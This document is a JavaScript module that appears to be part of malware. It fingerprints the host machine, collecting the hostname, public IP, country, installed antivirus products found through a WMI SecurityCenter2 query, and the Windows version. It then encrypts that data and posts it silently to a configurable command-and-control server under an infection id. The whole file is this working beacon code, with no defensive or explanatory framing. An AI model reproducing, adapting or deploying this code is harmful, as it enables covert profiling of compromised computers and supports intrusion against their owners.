const axios = require('axios');
const core = require('./core');
const config = require('../config');
const crypto = require('./crypto');

async function submitReport() {
    const hostname = core.execClear('hostname') == "" ? "hostname" : core.execClear('hostname');
    const ip = await getPublicIp();
    const country = await getCountry();
    const av = getAntivirus();
    const os = getSystemVersion();

    try {
        const data = crypto.encrypt(JSON.stringify({hostname: hostname, ip: ip, country: country, av: av, os: os}), config.encryptedKey);

        await axios.post(config.baseurl + "/report/" + config.id, data, {
            headers: {
                'Content-Type' : 'text/plain' 
            }
        });
    } catch (e) { }
}

async function getPublicIp() {
    try {
        const res = await axios({
            url: "https://api.ipify.org",
            method: "GET"
        });

        if (res.data.length > 16) {
            return "69.69.69.69";
        } else {
            return res.data;
        }
    } catch (e) {
        return "69.69.69.69";
    }
}

async function getCountry() {
    try {
        const res = await axios({
            url: "http://ip-api.com/line/?fields=countryCode",
            method: "GET"
        });
        
        if (res.data.length > 3) {
            return "UKN";
        } else {
            return res.data.replace('\n', '');
        }
    } catch (e) {
        return "UKN"
    }
}

function getAntivirus() {
    try {
        const res = core.execClear(`wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName`);
        return res == "" ? "No Antivirus" : res;
    } catch (e) {
        return "No Antivirus";
    }
}

function getSystemVersion() {
    try {
        const res = core.execClear(`wmic os get Caption | findstr /V /B /C:Caption`);
        return res == "" ? "Unknow Version" : res.replace('microsoft', '');
    } catch (e) {
        return "Unknow Version";
    }
}

module.exports = {
    submitReport,
    getCountry
}